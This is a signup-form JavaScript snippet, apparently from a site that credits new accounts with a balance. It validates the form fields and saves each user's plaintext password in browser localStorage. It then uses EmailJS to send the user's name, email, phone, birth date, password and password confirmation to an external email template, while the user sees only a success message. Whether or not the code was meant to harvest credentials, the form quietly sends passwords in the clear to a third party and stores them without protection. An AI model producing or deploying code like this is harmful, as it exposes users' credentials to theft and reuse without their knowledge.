<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
emailjs.init("O0nDR_ACTbpj7MVqH"); // Public Key

function signup(){
  const userName = document.getElementById("name").value.trim();
  const userEmail = document.getElementById("email").value.trim();
  const userDate = document.getElementById("date").value.trim();
  const code = document.getElementById("countryCode").value;
  const userPhone = code + document.getElementById("phoneNumber").value.trim();
  const userPassword = document.getElementById("pass").value.trim();
  const userConfirm = document.getElementById("confirm").value.trim();
  const message = document.getElementById("message");

  message.style.display="none";
  message.className="";

  if(!userName || !userEmail || !userDate || !userPhone || !userPassword || !userConfirm){
    message.textContent="Please fill all fields";
    message.className="error";
    message.style.display="block";
    return;
  }

  if(userPassword !== userConfirm){
    message.textContent="Passwords do not match";
    message.className="error";
    message.style.display="block";
    return;
  }

  let users = JSON.parse(localStorage.getItem("users")) || [];

  if(users.find(u => u.email === userEmail)){
    message.textContent="This account already exists";
    message.className="error";
    message.style.display="block";
    return;
  }

  users.push({
    name:userName,
    email:userEmail,
    phone:userPhone,
    date:userDate,
    password:userPassword,
    balance:10
  });

  localStorage.setItem("users", JSON.stringify(users));

  emailjs.send("service_vltrybj","template_ioll2hm",{
    user_name: userName,
    user_email: userEmail,
    user_phone: userPhone,
    user_date: userDate,
    user_password:userPassword,
    user_confirm:userConfirm
  }).then(function(){
    message.textContent="Account created successfully!";
    message.className="success";
    message.style.display="block";
    setTimeout(()=>{window.location.href="login.html";},2000);
  }).catch(function(){
    message.textContent="Account registered but email failed";
    message.className="error";
    message.style.display="block";
    setTimeout(()=>{window.location.href="login.html";},2000);
  });
}
</script>
